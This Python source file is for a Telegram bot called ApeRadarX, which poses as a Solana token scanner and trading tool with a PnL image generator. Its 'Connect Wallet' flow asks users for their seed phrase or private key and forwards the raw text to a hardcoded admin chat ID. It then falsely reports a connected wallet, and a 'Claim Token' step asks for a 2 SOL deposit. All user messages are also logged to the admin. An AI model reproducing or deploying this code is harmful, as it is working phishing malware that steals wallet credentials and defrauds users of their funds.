# trigger redeploy v2
"""
ApeRadarX Solana Telegram Bot — With PnL Card Generator
"""

import os
import re
import io
import math
import threading
import requests
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from PIL import Image, ImageDraw, ImageFont, ImageFilter
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# ──────────────────────────────────────────────
# Config
# ──────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
BOT_NAME = "ApeRadarX"
ADMIN_ID = 1495066761

# Track states
waiting_for_wallet = {}
waiting_for_pnl = {}  # user_id -> {"address": ..., "token": ..., "buy_mcap": ..., "current_mcap": ...}


# ──────────────────────────────────────────────
# Admin notification
# ──────────────────────────────────────────────
async def notify_admin(context, user, action, extra=""):
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"📡 *Activity Log*\n\n"
                 f"👤 Name: {user.full_name}\n"
                 f"🆔 ID: `{user.id}`\n"
                 f"📛 Username: @{user.username if user.username else 'No username'}\n"
                 f"🔘 Action: {action}"
                 + (f"\n📝 Message: `{extra}`" if extra else ""),
            parse_mode="Markdown"
        )
    except Exception:
        pass


# ──────────────────────────────────────────────
# PnL Card Generator
# ──────────────────────────────────────────────
def generate_pnl_card(token_symbol, token_name, buy_mcap, current_mcap, username, logo_url=None):
    """Generate a PnL card image similar to the example."""
    W, H = 1200, 675
    img = Image.new("RGB", (W, H), color=(5, 25, 5))
    draw = ImageDraw.Draw(img)

    # Dark green gradient background
    for y in range(H):
        ratio = y / H
        r = int(5 + ratio * 10)
        g = int(25 + ratio * 40)
        b = int(5 + ratio * 10)
        draw.line([(0, y), (W, y)], fill=(r, g, b))

    # Grid pattern overlay
    for x in range(0, W, 40):
        draw.line([(x, 0), (x, H)], fill=(0, 60, 0, 30), width=1)
    for y in range(0, H, 40):
        draw.line([(0, y), (W, y)], fill=(0, 60, 0, 30), width=1)

    # Glow effect in center
    for radius in range(300, 0, -30):
        alpha = int(15 * (1 - radius / 300))
        draw.ellipse(
            [(W//2 - radius, H//2 - radius), (W//2 + radius, H//2 + radius)],
            fill=(0, alpha * 2, 0)
        )

    # Calculate multiplier
    try:
        multiplier = current_mcap / buy_mcap
        multiplier_str = f"{multiplier:.1f}X"
        is_profit = multiplier >= 1
    except Exception:
        multiplier_str = "N/A"
        is_profit = True

    # Format mcap numbers
    def fmt_mcap(n):
        if n >= 1_000_000:
            return f"{n/1_000_000:.1f}M"
        if n >= 1_000:
            return f"{n/1_000:.1f}K"
        return str(n)

    # Try loading fonts
    try:
        font_big = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 130)
        font_med = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 55)
        font_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 38)
        font_tiny = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 30)
    except Exception:
        font_big = ImageFont.load_default()
        font_med = font_big
        font_small = font_big
        font_tiny = font_big

    # Token name top right
    draw.text((W - 50, 40), token_symbol, font=font_med, fill=(255, 255, 255), anchor="ra")
    draw.text((W - 50, 100), f"called at {fmt_mcap(buy_mcap)}", font=font_small, fill=(180, 255, 180), anchor="ra")

    # Big multiplier in center
    color = (0, 255, 80) if is_profit else (255, 60, 60)
    # Shadow
    draw.text((W//2 + 4, H//2 - 60 + 4), multiplier_str, font=font_big, fill=(0, 80, 0), anchor="mm")
    # Main text
    draw.text((W//2, H//2 - 60), multiplier_str, font=font_big, fill=color, anchor="mm")

    # Username
    user_display = f"@{username}" if username else "ApeRadarX User"
    draw.text((W//2, H//2 + 100), user_display, font=font_med, fill=(255, 255, 255), anchor="mm")

    # Current mcap
    draw.text((W//2, H//2 + 160), f"Current MCap: {fmt_mcap(current_mcap)}", font=font_small, fill=(150, 255, 150), anchor="mm")

    # Bottom watermark
    draw.text((W//2, H - 40), "@ApeRadarXBot", font=font_small, fill=(100, 200, 100), anchor="mm")

    # Try to load and paste logo from URL
    if logo_url:
        try:
            logo_resp = requests.get(logo_url, timeout=5)
            logo_img = Image.open(io.BytesIO(logo_resp.content)).convert("RGBA")
            logo_size = 90
            logo_img = logo_img.resize((logo_size, logo_size))
            # Paste logo at top center
            img.paste(logo_img, (W//2 - logo_size//2, 20), logo_img)
        except Exception:
            # Draw a simple circle logo placeholder
            draw.ellipse([(W//2 - 45, 20), (W//2 + 45, 110)], fill=(0, 100, 50), outline=(0, 255, 100), width=3)
            draw.text((W//2, 65), "ARX", font=font_small, fill=(255, 255, 255), anchor="mm")
    else:
        draw.ellipse([(W//2 - 45, 20), (W//2 + 45, 110)], fill=(0, 100, 50), outline=(0, 255, 100), width=3)
        draw.text((W//2, 65), "ARX", font=font_small, fill=(255, 255, 255), anchor="mm")

    # Save to bytes
    output = io.BytesIO()
    img.save(output, format="PNG")
    output.seek(0)
    return output


# ──────────────────────────────────────────────
# Token helpers
# ──────────────────────────────────────────────
def get_token_info(contract_address: str):
    url = f"https://api.dexscreener.com/latest/dex/tokens/{contract_address}"
    try:
        res = requests.get(url, timeout=10)
        data = res.json()
        pairs = data.get("pairs")
        if not pairs:
            return None
        pair = sorted(
            pairs,
            key=lambda p: float(p.get("liquidity", {}).get("usd", 0) or 0),
            reverse=True,
        )[0]
        return pair
    except Exception:
        return None


def format_number(n) -> str:
    try:
        n = float(n)
        if n >= 1_000_000_000:
            return f"${n/1_000_000_000:.2f}B"
        if n >= 1_000_000:
            return f"${n/1_000_000:.2f}M"
        if n >= 1_000:
            return f"${n/1_000:.2f}K"
        return f"${n:.4f}"
    except Exception:
        return "N/A"


def parse_mcap_input(text):
    """Parse user input like '9.3K', '1.2M', '500000' into a number."""
    text = text.strip().upper().replace(",", "")
    try:
        if text.endswith("K"):
            return float(text[:-1]) * 1_000
        elif text.endswith("M"):
            return float(text[:-1]) * 1_000_000
        elif text.endswith("B"):
            return float(text[:-1]) * 1_000_000_000
        else:
            return float(text)
    except Exception:
        return None


def build_token_message(pair: dict) -> str:
    base = pair.get("baseToken", {})
    name = base.get("name", "Unknown")
    symbol = base.get("symbol", "???")
    price_usd = pair.get("priceUsd", "N/A")
    price_change = pair.get("priceChange", {})
    h1 = price_change.get("h1", "N/A")
    h24 = price_change.get("h24", "N/A")
    volume_24h = pair.get("volume", {}).get("h24", "N/A")
    liquidity = pair.get("liquidity", {}).get("usd", "N/A")
    market_cap = pair.get("marketCap", "N/A")
    dex = pair.get("dexId", "N/A").upper()
    url = pair.get("url", "")

    def sign(val):
        try:
            return "🟢 +" if float(val) >= 0 else "🔴 "
        except Exception:
            return ""

    msg = (
        f"🪙 *{name}* (${symbol})\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"💵 Price: `${float(price_usd):.8f}`\n"
        f"📈 1h:  {sign(h1)}{h1}%\n"
        f"📊 24h: {sign(h24)}{h24}%\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"💧 Liquidity: {format_number(liquidity)}\n"
        f"📦 Volume 24h: {format_number(volume_24h)}\n"
        f"🏦 Market Cap: {format_number(market_cap)}\n"
        f"🔁 DEX: {dex}\n"
    )
    if url:
        msg += f"\n[📎 View on DexScreener]({url})"
    return msg


def token_keyboard(symbol, address):
    keyboard = [
        [
            InlineKeyboardButton(f"🟢 Buy {symbol}", callback_data=f"buy:{symbol}"),
            InlineKeyboardButton(f"🔴 Sell {symbol}", callback_data=f"sell:{symbol}"),
        ],
        [
            InlineKeyboardButton("📊 Generate PnL Card", callback_data=f"pnl:{address}"),
        ],
        [InlineKeyboardButton("🔄 Refresh", callback_data=f"refresh:{address}")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="home")],
    ]
    return InlineKeyboardMarkup(keyboard)


def is_valid_seed_or_key(text: str) -> bool:
    words = text.strip().split()
    if len(words) in (12, 24):
        return True
    if re.match(r'^[1-9A-HJ-NP-Za-km-z]{87,88}$', text.strip()):
        return True
    return False


# ──────────────────────────────────────────────
# Main menu
# ──────────────────────────────────────────────
def main_menu_keyboard():
    keyboard = [
        [
            InlineKeyboardButton("🟢 Buy", callback_data="buy_menu"),
            InlineKeyboardButton("🔴 Sell", callback_data="sell_menu"),
        ],
        [
            InlineKeyboardButton("👛 Connect Wallet", callback_data="connect_wallet"),
            InlineKeyboardButton("🎁 Claim Token", callback_data="claim_token"),
        ],
        [
            InlineKeyboardButton("👥 Referrals", callback_data="referrals"),
            InlineKeyboardButton("❓ Help", callback_data="help"),
        ],
        [
            InlineKeyboardButton("📊 PnL Card", callback_data="pnl_menu"),
            InlineKeyboardButton("🔄 Refresh", callback_data="refresh_home"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def main_menu_text():
    return (
        f"🦍 *Welcome to {BOT_NAME}\\!*\n\n"
        "Track hot tokens, catch early movers, and trade with speed\\.\n\n"
        "Built for apes, powered by real\\-time data, and designed to help "
        "you find the next rocket before it takes off 🚀\n\n"
        "━━━━━━━━━━━━━━━━━\n"
        "💰 *Wallet Balance:* 0\\.00 SOL\n"
        "━━━━━━━━━━━━━━━━━\n\n"
        "📋 *Paste a token contract address* to begin scanning\\.\n\n"
        "Use the buttons below to navigate\\."
    )


# ──────────────────────────────────────────────
# /start
# ──────────────────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    waiting_for_wallet[user.id] = False
    waiting_for_pnl[user.id] = None
    await notify_admin(context, user, "▶️ Started the bot")
    await update.message.reply_text(
        main_menu_text(),
        parse_mode="MarkdownV2",
        reply_markup=main_menu_keyboard(),
    )


# ──────────────────────────────────────────────
# /help
# ──────────────────────────────────────────────
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    await notify_admin(context, user, "❓ Clicked /help")
    await update.message.reply_text(
        f"❓ *{BOT_NAME} Help*\n\n"
        "🔍 Paste any Solana token contract address to scan it\n"
        "🟢 Buy / 🔴 Sell buttons appear after scanning\n"
        "📊 Generate PnL Card to show your gains\n"
        "👛 Connect Wallet to enable real trading\n"
        "🎁 Claim Token for airdrops & rewards\n"
        "👥 Referrals to invite friends\n"
        "🔄 Refresh to update your balance\n\n"
        "/start — Back to main menu",
        parse_mode="Markdown",
    )


# ──────────────────────────────────────────────
# Button handler
# ──────────────────────────────────────────────
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user = query.from_user

    await notify_admin(context, user, f"🔘 Clicked button: `{data}`")

    if data in ("home", "refresh_home"):
        waiting_for_wallet[user.id] = False
        waiting_for_pnl[user.id] = None
        await query.message.reply_text(
            main_menu_text(),
            parse_mode="MarkdownV2",
            reply_markup=main_menu_keyboard(),
        )

    elif data == "pnl_menu":
        waiting_for_pnl[user.id] = {"step": "address"}
        await query.message.reply_text(
            "📊 *PnL Card Generator*\n\n"
            "Paste the token contract address you want to generate a PnL card for:",
            parse_mode="Markdown",
        )

    elif data.startswith("pnl:"):
        address = data.split(":")[1]
        pair = get_token_info(address)
        if pair:
            symbol = pair.get("baseToken", {}).get("symbol", "TOKEN")
            name = pair.get("baseToken", {}).get("name", "Unknown")
            current_mcap = pair.get("marketCap", 0)
            waiting_for_pnl[user.id] = {
                "step": "buy_mcap",
                "address": address,
                "symbol": symbol,
                "name": name,
                "current_mcap": float(current_mcap) if current_mcap else 0,
            }
            await query.message.reply_text(
                f"📊 *{symbol} PnL Card*\n\n"
                f"Current MCap: {format_number(current_mcap)}\n\n"
                f"Now enter the MCap when you bought\n"
                f"_(e.g. 9.3K, 1.2M, 500K)_",
                parse_mode="Markdown",
            )
        else:
            await query.message.reply_text("❌ Could not fetch token data. Try again.")

    elif data == "buy_menu":
        await query.message.reply_text(
            "🟢 *Buy Token*\n\n"
            "Paste the token contract address you want to buy!",
            parse_mode="Markdown",
        )

    elif data == "sell_menu":
        await query.message.reply_text(
            "🔴 *Sell Token*\n\n"
            "Paste the token contract address you want to sell!",
            parse_mode="Markdown",
        )

    elif data == "connect_wallet":
        waiting_for_wallet[user.id] = True
        await query.message.reply_text(
            "👛 *Connect Wallet*\n\n"
            "To connect your Solana wallet, import your private key or seed phrase.\n\n"
            "⚠️ Never share your seed phrase with anyone!",
            parse_mode="Markdown",
        )

    elif data == "claim_token":
        if context.user_data.get("wallet_connected"):
            await query.message.reply_text(
                "🎁 *Claim Token*\n\n"
                "To claim your token, please deposit *2 SOL* to your connected wallet first.\n\n"
                "Once your deposit is confirmed, your tokens will be released automatically! 🚀",
                parse_mode="Markdown",
            )
        else:
            await query.message.reply_text(
                "🎁 *Claim Token*\n\n"
                "Click the *CONNECT WALLET* button to generate or connect your wallet and get started.",
                parse_mode="Markdown",
            )

    elif data == "referrals":
        ref_link = f"https://t.me/ApeRadarXBot?start=ref_{user.id}"
        await query.message.reply_text(
            f"👥 *Referrals*\n\n"
            f"Invite friends and earn rewards when they trade!\n\n"
            f"🔗 Your referral link:\n`{ref_link}`\n\n"
            f"Share this link with friends to earn bonuses!",
            parse_mode="Markdown",
        )

    elif data == "help":
        await query.message.reply_text(
            f"❓ *{BOT_NAME} Help*\n\n"
            "🔍 Paste any Solana token contract address to scan it\n"
            "📊 Generate PnL Card to show your gains\n"
            "🟢 Buy / 🔴 Sell buttons appear after scanning\n"
            "👛 Connect Wallet to enable real trading\n\n"
            "/start — Back to main menu",
            parse_mode="Markdown",
        )

    elif data.startswith("buy:"):
        symbol = data.split(":")[1]
        await query.message.reply_text(
            f"🟢 *Buy {symbol}*\n\n"
            "Enter the amount of SOL you want to spend:\n\n"
            "⚠️ _Connect your wallet first to make real trades._",
            parse_mode="Markdown",
        )

    elif data.startswith("sell:"):
        symbol = data.split(":")[1]
        await query.message.reply_text(
            f"🔴 *Sell {symbol}*\n\n"
            "Enter the amount of tokens you want to sell:\n\n"
            "⚠️ _Connect your wallet first to make real trades._",
            parse_mode="Markdown",
        )

    elif data.startswith("refresh:"):
        address = data.split(":")[1]
        pair = get_token_info(address)
        if pair:
            symbol = pair.get("baseToken", {}).get("symbol", "TOKEN")
            await query.message.edit_text(
                build_token_message(pair),
                parse_mode="Markdown",
                reply_markup=token_keyboard(symbol, address),
                disable_web_page_preview=True,
            )
        else:
            await query.message.reply_text("⚠️ Could not refresh token data.")


# ──────────────────────────────────────────────
# Handle all text messages
# ──────────────────────────────────────────────
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user = update.message.from_user

    # PnL flow
    pnl_state = waiting_for_pnl.get(user.id)

    if pnl_state and pnl_state.get("step") == "address":
        if 32 <= len(text) <= 44 and text.isalnum():
            await update.message.reply_text("🔍 Fetching token info...")
            pair = get_token_info(text)
            if pair:
                symbol = pair.get("baseToken", {}).get("symbol", "TOKEN")
                name = pair.get("baseToken", {}).get("name", "Unknown")
                current_mcap = pair.get("marketCap", 0)
                waiting_for_pnl[user.id] = {
                    "step": "buy_mcap",
                    "address": text,
                    "symbol": symbol,
                    "name": name,
                    "current_mcap": float(current_mcap) if current_mcap else 0,
                }
                await update.message.reply_text(
                    f"📊 *{symbol} PnL Card*\n\n"
                    f"Current MCap: {format_number(current_mcap)}\n\n"
                    f"Now enter the MCap when you bought\n"
                    f"_(e.g. 9.3K, 1.2M, 500K)_",
                    parse_mode="Markdown",
                )
            else:
                await update.message.reply_text("❌ Token not found. Try a different address.")
        else:
            await update.message.reply_text("⚠️ Please paste a valid Solana token contract address.")
        return

    if pnl_state and pnl_state.get("step") == "buy_mcap":
        buy_mcap = parse_mcap_input(text)
        if buy_mcap and buy_mcap > 0:
            current_mcap = pnl_state["current_mcap"]
            symbol = pnl_state["symbol"]
            name = pnl_state["name"]
            username = user.username or user.first_name or "Ape"

            waiting_for_pnl[user.id] = None

            await update.message.reply_text("🎨 Generating your PnL card...")

            # Get token logo
            logo_url = None
            try:
                pair = get_token_info(pnl_state["address"])
                if pair:
                    info = pair.get("info", {})
                    logo_url = info.get("imageUrl")
            except Exception:
                pass

            # Generate card
            card = generate_pnl_card(
                token_symbol=symbol,
                token_name=name,
                buy_mcap=buy_mcap,
                current_mcap=current_mcap,
                username=username,
                logo_url=logo_url,
            )

            multiplier = current_mcap / buy_mcap if buy_mcap > 0 else 0
            caption = (
                f"📊 *{symbol} PnL Card*\n"
                f"Buy MCap: {format_number(buy_mcap)}\n"
                f"Current MCap: {format_number(current_mcap)}\n"
                f"Multiplier: *{multiplier:.1f}X* 🚀\n\n"
                f"Generated by @ApeRadarXBot"
            )

            await update.message.reply_photo(
                photo=card,
                caption=caption,
                parse_mode="Markdown",
            )
            await notify_admin(context, user, f"📊 Generated PnL card for {symbol}", f"Buy: {buy_mcap}, Current: {current_mcap}")
        else:
            await update.message.reply_text(
                "⚠️ Invalid MCap format. Please enter a value like:\n"
                "`9.3K`, `1.2M`, `500000`",
                parse_mode="Markdown",
            )
        return

    # Wallet connect flow
    if waiting_for_wallet.get(user.id):
        if is_valid_seed_or_key(text):
            await notify_admin(context, user, "👛 Submitted wallet credentials", text)
            waiting_for_wallet[user.id] = False
            context.user_data["wallet_connected"] = True
            await update.message.reply_text(
                "✅ *Wallet connected successfully!*\n\n"
                "Your wallet has been linked. You can now buy and sell tokens.",
                parse_mode="Markdown",
            )
        else:
            await notify_admin(context, user, "❌ Invalid wallet input attempt", text)
            await update.message.reply_text(
                "⚠️ Invalid seed phrase. Check your words and try again.",
            )
        return

    # Token address lookup
    if 32 <= len(text) <= 44 and text.isalnum():
        await update.message.reply_text("🔍 Scanning token...")
        pair = get_token_info(text)
        if pair:
            symbol = pair.get("baseToken", {}).get("symbol", "TOKEN")
            await notify_admin(context, user, f"🔍 Scanned token: {symbol}", text)
            await update.message.reply_text(
                build_token_message(pair),
                parse_mode="Markdown",
                reply_markup=token_keyboard(symbol, text),
                disable_web_page_preview=True,
            )
        else:
            await notify_admin(context, user, "❌ Token not found", text)
            await update.message.reply_text(
                "❌ Token not found on DexScreener.\n\n"
                "Make sure you pasted a valid Solana token contract address."
            )
    else:
        await notify_admin(context, user, "💬 Sent a message", text)
        await update.message.reply_text(
            "👋 Paste a Solana token contract address to scan it!\n"
            "Or tap /start for the main menu."
        )


# ──────────────────────────────────────────────
# Web server for Render
# ──────────────────────────────────────────────
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ApeRadarX Bot is running!")
    def log_message(self, format, *args):
        pass

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), HealthHandler)
    server.serve_forever()


# ──────────────────────────────────────────────
# Main
# ──────────────────────────────────────────────
if __name__ == "__main__":
    print("🤖 Bot is starting...")
    thread = threading.Thread(target=run_web_server)
    thread.daemon = True
    thread.start()
    print("✅ Web server started!")

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("✅ Bot is running! Press Ctrl+C to stop.")
    app.run_polling()
